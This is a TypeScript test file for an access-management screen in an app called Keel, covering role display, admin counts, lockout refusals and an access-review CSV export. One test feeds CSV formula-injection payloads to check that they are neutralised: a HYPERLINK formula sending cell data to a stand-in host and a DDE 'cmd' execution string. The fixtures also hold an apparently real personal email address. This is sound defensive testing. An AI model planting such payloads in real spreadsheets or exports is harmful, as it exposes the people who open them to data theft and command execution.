import assert from "node:assert/strict";
import { test } from "node:test";

import { addPerson, changePerson, fromStartOf, untilEndOf } from "@/lib/people-change";
import {
  LAST_ADMIN_WORDS,
  accessLine,
  accessReviewCsv,
  addRoleDetail,
  changeRefusal,
  filterWords,
  grantWindowWords,
  isLastAdmin,
  parseFilters,
  peopleCounts,
  peopleStatus,
  peopleVerdict,
  personMatches,
  personName,
  personState,
  roleChips,
  sinceWords,
} from "@/lib/people-view";
import type { PrincipalView } from "@/lib/principals";
import { renderPeopleAt } from "./render-people";

const NOW = "2026-10-02T09:40:00Z";
const ADMIN = "8c1e0000-0000-4000-8000-0000000000a1";
const grant = (id: string, role: string, from = "2026-09-01T00:00:00Z", until: string | null = null, scope = "*") => ({ id: `6a000000-0000-4000-8000-0000000000${id}`, role, active_from: from, active_until: until, granted_by: ADMIN, scope });
const PEOPLE: PrincipalView[] = [
  { id: ADMIN, email: "marouanedefili@gmail.com", display_name: "Marouane Defili", disabled_at: null, capabilities: ["read", "approve", "users", "roles"], role_grants: [grant("01", "admin"), grant("02", "approver")] },
  { id: "8c1e0000-0000-4000-8000-0000000000a2", email: "amara.okafor@contoso.example", display_name: "Amara Okafor", disabled_at: null, capabilities: ["approve"], role_grants: [grant("03", "approver")] },
  { id: "8c1e0000-0000-4000-8000-0000000000b4", email: "lee.chen@contoso.example", display_name: null, disabled_at: null, capabilities: ["read"], entity_capabilities: { CONTOSO_FR: ["collect"] }, role_grants: [grant("06", "viewer"), grant("07", "operator", "2026-09-01T00:00:00Z", null, "entity:CONTOSO_FR")] },
  { id: "8c1e0000-0000-4000-8000-0000000000b5", email: "priya.nair@contoso.example", disabled_at: null, capabilities: [], role_grants: [grant("08", "viewer", "2026-10-05T00:00:00Z")] },
  { id: "8c1e0000-0000-4000-8000-0000000000c3", email: "former.contractor@contoso.com", disabled_at: "2026-09-20T10:00:00Z", capabilities: [], role_grants: [grant("09", "operator", "2026-06-01T00:00:00Z", "2026-09-20T10:00:00Z")] },
  { id: "8c1e0000-0000-4000-8000-0000000000d1", email: "scheduler@keel.internal", display_name: "KEEL scheduler", system_kind: "scheduler", disabled_at: null, capabilities: ["collect", "configuration"], role_grants: [] },
];

test("People words: names from emails, states, counts, status and the verdict", () => {
  assert.equal(personName(PEOPLE[2]), "Lee Chen");
  assert.equal(personName(PEOPLE[4]), "Former Contractor");
  assert.equal(personName(PEOPLE[5]), "Keel's scheduler");
  assert.deepEqual(PEOPLE.slice(0, 5).map((person) => personState(person, NOW)), ["active", "active", "active", "starts-later", "disabled"]);
  const counts = peopleCounts(PEOPLE, NOW);
  assert.deepEqual(counts, { canUse: 3, admins: 1, approvers: 2, disabled: 1, total: 5 }, "Keel's own accounts are not counted");
  assert.deepEqual(peopleStatus(counts), { tone: "soon", label: "Only 1 admin" });
  assert.equal(peopleVerdict(counts).text, "3 people can use Keel; 2 can approve.");
  assert.equal(peopleStatus({ ...counts, approvers: 0 }).tone, "urgent");
  assert.equal(peopleVerdict({ ...counts, approvers: 0 }).text, "3 people can use Keel, and nobody can approve.");
  assert.deepEqual(peopleStatus({ ...counts, admins: 2 }), { tone: "fine", label: "2 admins" });
});

test("a sentence about a person never starts with You", () => {
  for (const person of PEOPLE) assert.doesNotMatch(accessLine(person, NOW), /^You\b/);
  assert.equal(accessLine(PEOPLE[0], NOW), "Can approve, manage people and grant roles");
  assert.equal(accessLine(PEOPLE[2], NOW), "Can view; more for Contoso FR");
  assert.equal(accessLine(PEOPLE[3], NOW), "Can do nothing yet. Their first role starts later.");
});

test("rows: role chips, since when, and filters set by the tiles", () => {
  assert.deepEqual(roleChips(PEOPLE[2], NOW).map((chip) => chip.label), ["Viewer", "Operator, only for Contoso FR"]);
  assert.deepEqual(roleChips(PEOPLE[3], NOW), [{ label: "Viewer from 5 Oct 2026", tone: "low" }]);
  assert.equal(sinceWords(PEOPLE[0], NOW), "Since 1 Sept 2026");
  assert.equal(sinceWords(PEOPLE[4], NOW), "Disabled on 20 Sept 2026");
  // Access lasts until the last live role ends.
  assert.equal(sinceWords({ ...PEOPLE[1], role_grants: [grant("10", "viewer", "2026-09-01T00:00:00Z", "2026-11-30T00:00:00Z"), grant("11", "approver", "2026-09-01T00:00:00Z", "2026-11-05T00:00:00Z")] }, NOW), "Since 1 Sept 2026, until 30 Nov 2026");
  // A role cancelled before it started reads as ended, never as starting later.
  const cancelled = { ...PEOPLE[3], role_grants: [grant("12", "viewer", "2026-10-05T00:00:00Z", "2026-10-01T12:00:00Z")] };
  assert.equal(personState(cancelled, NOW), "no-role");
  assert.deepEqual(roleChips(cancelled, NOW), []);
  assert.equal(grantWindowWords(cancelled.role_grants[0], NOW), "Cancelled before it started, 1 Oct 2026");
  const approvers = parseFilters((key) => (key === "role" ? "approver" : null));
  assert.deepEqual(PEOPLE.filter((person) => personMatches(person, approvers, NOW)).map((person) => person.id), [PEOPLE[0].id, PEOPLE[1].id]);
  assert.equal(filterWords(approvers), "approvers");
  assert.deepEqual(parseFilters((key) => (key === "role" ? "owner" : key === "state" ? "gone" : null)), { roles: [], states: [] }, "unknown values are ignored");
  // The tiles add up: approvers or disabled people shows both.
  const either = parseFilters((key) => (key === "role" ? "approver" : key === "state" ? "disabled" : null));
  assert.deepEqual(PEOPLE.filter((person) => personMatches(person, either, NOW)).map((person) => person.id), PEOPLE.filter((person) => personMatches(person, approvers, NOW) || Boolean(person.disabled_at)).map((person) => person.id));
  assert.equal(filterWords(either), "disabled people or approvers");
  assert.equal(addRoleDetail("viewer", PEOPLE.slice(1, 5), NOW), "From now on they can see backups, changes and reports. 1 already holds it and stays as is. 1 is disabled and is left out.");
});

test("the last admin is known before any click, and a lockout refusal says why", () => {
  assert.equal(isLastAdmin(PEOPLE[0], PEOPLE, NOW), true);
  assert.equal(isLastAdmin(PEOPLE[1], PEOPLE, NOW), false);
  assert.equal(changeRefusal(403, "last_admin"), LAST_ADMIN_WORDS);
  assert.equal(changeRefusal(403, "forbidden"), "You do not have permission to change people or roles.");
  assert.equal(changeRefusal(409, "exists"), "Someone with this email is already in Keel.");
});

test("the access review export has one line per role grant and no system accounts", () => {
  const csv = accessReviewCsv(PEOPLE, NOW).trim().split("\n");
  assert.equal(csv[0], "Name,Email,State,Role,Where,From,Until,Granted by,Why");
  assert.ok(csv.includes("Lee Chen,lee.chen@contoso.example,Active,Operator,Contoso FR,2026-09-01,,Marouane Defili,"));
  assert.ok(!csv.some((line) => line.includes("scheduler")));
  assert.equal(csv.length, 1 + 7);
});

test("the access review export neutralises names and reasons a spreadsheet would run as formulas", () => {
  const payloads = ["=1+1", "+1+1", "-1+1", "@SUM(1,1)", '=HYPERLINK("https://example.invalid/?d="&B3,"Open")'];
  const people: PrincipalView[] = payloads.map((name, i) => ({ id: `8c1e0000-0000-4000-8000-0000000001${String(i).padStart(2, "0")}`, email: `p${i}@contoso.example`, display_name: name, disabled_at: null, capabilities: ["read"], role_grants: [{ ...grant(`1${i}`, "viewer"), reason: "=cmd|' /C calc'!A0" }] }));
  const csv = accessReviewCsv(people, NOW);
  for (const name of payloads) assert.ok(csv.includes(`'${name}`) || csv.includes(`"'${name.replaceAll('"', '""')}"`), `${JSON.stringify(name)} is prefixed`);
  for (const line of csv.trim().split("\n").slice(1)) {
    assert.match(line, /^"?'/, "the name cell starts with a quote mark");
    assert.match(line, /,"?'=cmd/, "the reason cell starts with a quote mark");
  }
});

test("each control reaches its guarded route with the body it takes", async () => {
  const calls: { url: string; body: unknown }[] = [];
  const original = globalThis.fetch;
  globalThis.fetch = (async (url: string, init?: RequestInit) => {
    calls.push({ url, body: JSON.parse(String(init?.body)) });
    if (url === "/api/principals") return Response.json({ error: "exists" }, { status: 409 });
    if (url.endsWith("/disable")) return Response.json({ error: "last_admin" }, { status: 403 });
    return Response.json({ result: {} });
  }) as typeof fetch;
  try {
    assert.deepEqual(await changePerson("p1", { kind: "grant", role: "viewer", activeFrom: null, activeUntil: untilEndOf("2026-11-03"), reason: "Temp" }), { ok: true });
    assert.deepEqual(await changePerson("p1", { kind: "revoke", grantId: "g1" }), { ok: true });
    assert.deepEqual(await changePerson("p1", { kind: "enable" }), { ok: true });
    assert.deepEqual(await changePerson("p1", { kind: "disable" }), { ok: false, reason: LAST_ADMIN_WORDS });
    assert.deepEqual(await addPerson({ email: "lee@test.example", role: "viewer" }), { ok: false, reason: "Someone with this email is already in Keel." });
  } finally {
    globalThis.fetch = original;
  }
  assert.deepEqual(calls.map((call) => call.url), ["/api/principals/p1/grant", "/api/principals/p1/revoke", "/api/principals/p1/enable", "/api/principals/p1/disable", "/api/principals"]);
  assert.deepEqual(calls[0].body, { role: "viewer", activeFrom: null, activeUntil: "2026-11-03T23:59:59.000Z", reason: "Temp" });
  assert.deepEqual(calls[1].body, { grantId: "g1" });
  assert.equal(fromStartOf("2026-10-02", "2026-10-02"), null, "today means now");
  assert.equal(fromStartOf("2026-10-09", "2026-10-02"), "2026-10-09T00:00:00.000Z");
});

test("the page body: tiles filter by link, ids stay in the record, the scheduler has no controls", async () => {
  const html = await renderPeopleAt("role=approver", { people: PEOPLE, canUsers: true, canRoles: true, now: NOW });
  assert.match(html, /Showing <b>2<\/b> of 5 people/);
  assert.match(html, /href="\/principals\?role=admin%2Capprover"/, "Admins adds to Can approve");
  assert.match(html, /href="\/principals"[^>]*>[\s\S]*?Can approve/, "the active tile clears its filter");
  const record = html.indexOf('data-layer="record"');
  const visible = html.slice(0, record).replace(/ (data-row-id|href|title|id|for|aria-labelledby)="[^"]*"/g, "");
  assert.doesNotMatch(visible, /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/);
  assert.doesNotMatch(visible, /You can/);
  const all = await renderPeopleAt("", { people: PEOPLE, canUsers: true, canRoles: true, now: NOW });
  const keel = all.slice(all.indexOf("Keel&#x27;s own accounts"), all.indexOf('data-layer="record"'));
  assert.match(keel, /Keel&#x27;s scheduler/);
  assert.doesNotMatch(keel, /<button|<a /, "Keel's own accounts have no controls");
});
